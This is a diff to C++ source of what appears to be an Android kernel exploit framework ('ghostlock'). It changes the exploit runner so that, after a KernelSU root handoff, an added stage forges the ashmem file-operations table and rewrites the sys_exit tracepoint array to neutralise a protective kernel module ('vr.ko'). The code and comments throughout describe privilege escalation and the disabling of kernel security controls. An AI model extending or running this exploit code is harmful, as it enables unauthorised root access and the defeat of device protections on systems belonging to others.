@@ -5,6 +5,7 @@
 #include "route/component_catalog.hpp"
 #include "route/frontend_contract.hpp"
 #include "route/route_policy.hpp"
+#include "session/backend/cfi_stage.hpp"
 #include "session/exploit_session.hpp"
 #include "session/stage_types.hpp"
 
@@ -67,32 +68,50 @@ namespace ghostlock::runtime {
         static_assert(target != DispatchTarget::None);
 
         /* Backend steps first (Continue hands the chain on), then the frontend
-         * handoff. Middleware hooks are direct static calls on the middleware
-         * policy; no vtable or indirect dispatch enters the path. */
+         * handoff, and only then the anti-vr.ko CFI stage. Middleware hooks are
+         * direct static calls on the middleware policy; no vtable or indirect
+         * dispatch enters the path.
+         *
+         * The CFI stage runs last on purpose. It swaps &ashmem_misc.fops for a
+         * forged table and rewrites the sys_exit tracepoint funcs array to
+         * neutralise vr.ko; doing that before the rooted child has settled
+         * KernelSU destabilises the framework restart and soft-reboots the
+         * device. Root is handed over by the frontend step above, so by here the
+         * KSU handoff has completed. */
         [[nodiscard]] static RunResult run(session::ExploitSession &exploit_session,
                                            const profile::kernel_offsets &decoded,
                                            const char *debug_dir, bool force_attack) {
             session::VictimChain chain{};
+            bool handoff_done = false;
             switch (Backend::template run<Middleware>(exploit_session, decoded, debug_dir,
                                                       force_attack, chain)) {
                 case session::StageResult::Failed:
                     return RunResult{.code = RunCode::Failed, .stage = RunStage::Backend};
                 case session::StageResult::Done:
-                    return RunResult{.code = RunCode::DiagnosticStop, .stage = RunStage::Backend};
+                    /* KernelSU already rooted: the handoff is skipped, but the
+                     * anti-vr.ko stage still has to run below. */
+                    handoff_done = true;
+                    break;
                 case session::StageResult::Continue:
                     break;
             }
-            switch (Frontend::run(exploit_session, chain)) {
-                case session::StageResult::Failed:
-                    return RunResult{.code = RunCode::Failed, .stage = RunStage::Frontend};
-                case session::StageResult::Done:
-                    return RunResult{.code = RunCode::Completed, .stage = RunStage::Frontend};
-                case session::StageResult::Continue:
-                    /* The frontend step is terminal; Continue is a contract
-                     * violation and must not be silently read as success. */
-                    return RunResult{.code = RunCode::Failed, .stage = RunStage::Frontend};
+            if (!handoff_done) {
+                switch (Frontend::run(exploit_session, chain)) {
+                    case session::StageResult::Failed:
+                        return RunResult{.code = RunCode::Failed, .stage = RunStage::Frontend};
+                    case session::StageResult::Done:
+                        break;
+                    case session::StageResult::Continue:
+                        /* The frontend step is terminal; Continue is a contract
+                         * violation and must not be silently read as success. */
+                        return RunResult{.code = RunCode::Failed, .stage = RunStage::Frontend};
+                }
             }
-            return RunResult{.code = RunCode::Failed, .stage = RunStage::Frontend};
+            /* Anti-vr.ko, after the KernelSU handoff. A miss is reported by the
+             * stage itself and is not fatal to an already-rooted run: the
+             * per-task tag clear still carries the bypass. */
+            (void) session::backend::run_cfi_stage<Middleware>(exploit_session);
+            return RunResult{.code = RunCode::Completed, .stage = RunStage::Frontend};
         }
     };
 } // namespace ghostlock::runtime
